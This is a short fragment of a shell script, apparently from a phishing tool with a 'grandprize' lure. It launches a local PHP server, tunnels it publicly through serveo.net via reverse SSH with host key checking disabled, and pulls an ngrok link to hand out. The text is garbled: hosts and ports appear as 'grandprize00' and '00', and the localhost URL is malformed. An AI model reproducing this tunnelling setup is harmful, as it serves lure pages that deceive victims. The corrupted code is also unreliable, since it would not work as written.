...
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:grandprize serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:grandprize00 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (grandprize00)\e[0m\n"
fuser -k 00/tcp > /dev/null 2>&1
php -S grandprize00 > /dev/null 2>&1 &
sleep 3
...
link=$(curl -s -N https://127.0.0.1.4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
